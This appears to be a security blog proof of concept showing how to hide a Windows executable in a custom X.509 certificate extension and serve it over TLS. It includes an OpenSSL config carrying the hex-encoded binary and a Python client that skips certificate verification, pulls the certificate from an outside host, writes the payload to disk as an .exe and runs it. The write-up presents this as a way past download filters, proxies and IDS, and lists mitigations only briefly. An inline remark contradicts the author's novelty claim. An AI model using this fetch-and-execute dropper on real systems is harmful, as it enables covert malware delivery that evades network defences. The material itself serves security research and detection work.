# Payloads Over TLS: Smuggling Executables Inside X.509 Certificates

## Introduction

Transport Layer Security (TLS) is widely used to protect the confidentiality and integrity of network traffic. But what if the very mechanism designed to secure traffic could be used to **deliver a payload**?
This proof of concept (PoC) demonstrates how an attacker can embed a full Windows executable inside an X.509 certificate extension and deliver it over HTTPS. Once the client connects and retrieves the certificate, it can extract and execute the binary locally.
No traditional download. No HTTP request. Just **certificate data**.

To the best of my knowledge, this technique of embedding and extracting a full binary payload from an X.509 certificate extension has not been publicly demonstrated before. If similar research or PoCs exist, I would appreciate references or contact. ==> https://www.extrahop.com/blog/stop-ssl-tls-exfil does exactly this since 2018 

---

## The Concept

1. **Create a benign-looking certificate**
   * Embed a binary payload (e.g., a PE executable) in a custom extension
   * Use OpenSSL to generate the certificate
2. **Serve the certificate over HTTPS**
   * Use a TLS server with the custom certificate (e.g., `openssl s_server`)
3. **Extract the binary on the client**
   * Use a Python script to connect, retrieve the certificate, extract the payload, and run it
4. **(Optional)** If an outbound proxy **does not perform SSL inspection**, the payload reaches the client untouched.

---

## How It Works

### Certificate Extension

We use OpenSSL with a custom config:

```ini
[ req ]
distinguished_name = dn
x509_extensions = ext
prompt = no

[ dn ]
CN = totallylegit.com

[ ext ]
1.2.3.4.5.6=DER:4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000a00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000476f4c696e6b2c20476f41736d207777772e476f446576546f6f6c2e636f6d00504500004c01030098e07a680000000000000000e00003010b010100000200000004000000000000001000000010000000200000000040000010000000020000040000000000000004000000000000000040000000040000b9ae00000300000000001000000001000000100000100000000000001000000000000000000000002430000028000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000300000100000000000000000000000000000000000000000000000000000002e7465787400000020000000001000000002000000040000000000000000000000000000200000602e6461746100000020000000002000000002000000060000000000000000000000000000400000c02e696461746100009800000000300000000200000008000000000000000000000000000020000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006af5e8092000006a006a006a1f680020400050e8fe1f00006a00e8fd1f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000048692066726f6d205365637572697479526162626974732e636f6d20210d0a000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006a3000007a3000008a30000000000000ff2500304000ff2504304000ff250830400000004c30000000000000000000005c3000000030000000000000000000000000000000000000000000006a3000007a3000008a300000000000004b45524e454c33322e646c6c0000fb0247657453746448616e646c65000044065772697465436f6e736f6c6541007f014578697450726f6365737300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

Here, the executable is converted to a hexadecimal string and placed in a custom extension identified by an arbitrary OID (e.g., `1.2.3.4.5.6`).

---

## Client Extraction Script (Python)

```python
import subprocess
import ssl, socket
from cryptography import x509
from cryptography.hazmat.backends import default_backend

print("Getting SSL certificate from totallylegit.com...")
hostname    = 'totallylegit.com'
ctx         = ssl._create_unverified_context()
with ctx.wrap_socket(socket.socket(), server_hostname=hostname) as s:
    s.connect((hostname, 4443))
    cert_der = s.getpeercert(binary_form=True)
cert        = x509.load_der_x509_certificate(cert_der, backend=default_backend())
payload     = cert.extensions.get_extension_for_oid(x509.ObjectIdentifier("1.2.3.4.5.6")).value.value
with open("totallylegit.exe", "wb") as f:
    f.write(payload)

print("totallylegit.exe is ready.\nRunning...\n")
subprocess.run(["totallylegit.exe"])
```

---

## Why It Matters

* **Bypasses traditional download filters**: There’s no HTTP GET, no `.exe` URL, and nothing obvious to block.
* **Evasive**: Most IDS/IPS, proxies, and firewalls do not deeply parse certificate fields.
* **Portable**: This can be adapted to other formats (e.g., PEM) or platforms.

---

## Mitigations

* **TLS inspection (MITM)**: Proxies that inspect and re-sign TLS traffic typically strip custom extensions.
* **Certificate parsing rules**: Security tools should flag unusual or oversized X.509 extensions.
* **Payload detection**: Endpoint detection should still flag and block unexpected binaries.

---

## Limitations

* Size is capped (\~64 KB, depending on the TLS stack)
* Client must parse and extract the payload
* May not work against all servers/clients due to extension parsing differences

---

## Conclusion

Certificates are usually seen as static and boring. But they can become a **covert channel** for data exfiltration, payload delivery, or even steganography. This PoC is a reminder: **don’t trust blindly just because it’s wrapped in TLS.**
